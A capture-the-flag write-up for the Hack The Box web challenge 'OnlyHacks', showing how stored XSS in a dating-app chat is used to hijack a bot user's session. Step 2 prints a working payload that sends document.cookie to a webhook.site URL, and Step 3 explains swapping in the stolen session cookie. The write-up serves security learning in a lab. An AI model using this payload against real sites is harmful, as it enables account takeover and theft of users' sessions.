---
title: "HTB Challenge - OnlyHacks"
author: "M0k4"
date: "2026-05-27"
tags: ["htb", "challenge", "web", "very-easy", "xss", "session-hijack"]
---

# HTB Challenge - OnlyHacks

**Category:** `Web`  
**Difficulty:** `Very Easy`  
**Tags:** #XSS #SessionHijacking #StoredXSS  
**Flag:** `HTB{REDACTED}` *(redact before publishing)*

---
## Synopsis

OnlyHacks is a dating-app themed web challenge where the chat feature is vulnerable to **stored XSS**. By sending a cookie-exfiltration payload to the bot user (Renata), we capture her `session` cookie via a webhook, hijack her session in the browser, and read the flag from her chats.

---
## Skills Required

- Stored XSS testing
- Basic session hijacking (cookie swap)
- Using a request catcher (e.g., webhook.site)

## Skills Learned

- Identifying the â€œvictimâ€ browser by request metadata (referer/IP/user-agent)
- Avoiding self-trigger confusion (attacker vs bot requests)

---
## Analysis

### Challenge Materials

- Remote web instance: `http://154.57.164.61:30324`
- No downloadable files
- Registration requires a profile picture upload

### Initial Recon

```bash
curl 154.57.164.61:30324
curl 154.57.164.61:30324/login
```

![[onlyhacks_01_curl.png]]

The root path redirects to `/dashboard` and the app exposes `/login` and `/register`.

![evidence](onlyhacks_01_login.png)

![evidence](onlyhacks_02_register.png)

After creating an account and logging in, profiles can be liked on the dashboard.

![evidence](onlyhacks_03_dashboard_profile.png)

Matching with users unlocks chat. The interesting match here is **Renata**, which behaves like an automated victim/bot user.

![evidence](onlyhacks_04_chat_window.png)

---
## Solution

### Step 1 â€“ Confirm stored XSS in chat

We first verify if chat messages are reflected/stored without sanitization by sending a simple `<script>alert(0)</script>` payload.

```html
<script>alert(0)</script>
```

The alert triggers when the chat renders, confirming **stored XSS**.

![evidence](onlyhacks_05_xss_alert.png)

Renata responds with a warning message (flavor text); it does not prevent execution.

![evidence](onlyhacks_06_renata_warning.png)

---
### Step 2 â€“ Exfiltrate Renataâ€™s `session` cookie to a webhook

To hijack the victim session, we send a payload that appends `document.cookie` to our webhook URL. This will trigger twice: once in our own browser (when we view the chat), and once in Renataâ€™s bot browser.

```html
<script>new Image().src='https://webhook.site/<YOUR-ID>/?c='+document.cookie</script>
```

After sending the payload and refreshing the webhook inbox, we observe two GET requests. The one corresponding to Renataâ€™s bot can be identified by metadata such as a localhost referer (the server rendering the app internally).

![evidence](onlyhacks_07_webhook_cookie.png)

The sent payloads are visible in the chat history.

![evidence](onlyhacks_08_payloads_sent.png)

---
### Step 3 â€“ Hijack Renataâ€™s session and retrieve the flag

With Renataâ€™s `session` value, we replace our browserâ€™s cookie:

- Open DevTools â†’ **Application** â†’ **Cookies** â†’ `http://154.57.164.61:30324`
- Replace the `session` cookie value with Renataâ€™s exfiltrated value
- Refresh the page to browse as Renata

The flag is then accessible in Renataâ€™s chat list (with Dimitris).

![[onlyhacks_09_flag_leak.png]]

ðŸ **Flag obtained:** `HTB{REDACTED}`

---
## Summary

1. Confirmed **stored XSS** in the chat message renderer.
2. Exfiltrated the botâ€™s `session` cookie via webhook request.
3. Replaced local cookie to hijack the bot session and read the flag.

---
## Lessons Learned

- Stored XSS is enough for session hijack when cookies are readable (no `HttpOnly`) and CSP is permissive/missing.
- Always distinguish attacker-triggered requests from victim-triggered requests using headers/referer/user-agent.

---
## References

- webhook.site request catcher: `https://webhook.site/`
